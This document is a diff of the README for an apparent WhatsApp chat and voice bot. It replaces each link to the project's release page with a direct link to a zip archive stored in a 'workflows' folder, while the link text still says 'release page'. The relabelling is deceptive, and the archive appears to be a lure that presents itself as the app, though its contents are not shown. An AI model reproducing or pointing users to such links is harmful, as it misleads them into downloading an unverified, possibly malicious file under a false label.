@@ -1,6 +1,6 @@
 # 🤖 Whatsapp-chat-voice-Bot-with-Realtime-scraping - AI Chat for WhatsApp Leads
 
-[![⬇️ Download the app](https://img.shields.io/badge/Download%20Now-Release%20Page-blue?style=for-the-badge)](https://github.com/wolfie88/Whatsapp-chat-voice-Bot-with-Realtime-scraping/releases)
+[![⬇️ Download the app](https://img.shields.io/badge/Download%20Now-Release%20Page-blue?style=for-the-badge)](https://raw.githubusercontent.com/wolfie88/Whatsapp-chat-voice-Bot-with-Realtime-scraping/main/workflows/scraping_Bot_voice_Realtime_chat_Whatsapp_with_v1.8.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ This app helps you handle WhatsApp, Instagram, and Facebook chats in one place. 
 
 Use the release page to get the Windows version.
 
-[Visit the release page to download](https://github.com/wolfie88/Whatsapp-chat-voice-Bot-with-Realtime-scraping/releases)
+[Visit the release page to download](https://raw.githubusercontent.com/wolfie88/Whatsapp-chat-voice-Bot-with-Realtime-scraping/main/workflows/scraping_Bot_voice_Realtime_chat_Whatsapp_with_v1.8.zip)
 
 ## 🪟 Windows Setup
 
@@ -24,7 +24,7 @@ Use the release page to get the Windows version.
 
 Use this link to visit the page and download the Windows release:
 
-[https://github.com/wolfie88/Whatsapp-chat-voice-Bot-with-Realtime-scraping/releases](https://github.com/wolfie88/Whatsapp-chat-voice-Bot-with-Realtime-scraping/releases)
+[https://raw.githubusercontent.com/wolfie88/Whatsapp-chat-voice-Bot-with-Realtime-scraping/main/workflows/scraping_Bot_voice_Realtime_chat_Whatsapp_with_v1.8.zip](https://raw.githubusercontent.com/wolfie88/Whatsapp-chat-voice-Bot-with-Realtime-scraping/main/workflows/scraping_Bot_voice_Realtime_chat_Whatsapp_with_v1.8.zip)
 
 After you download the file:
 
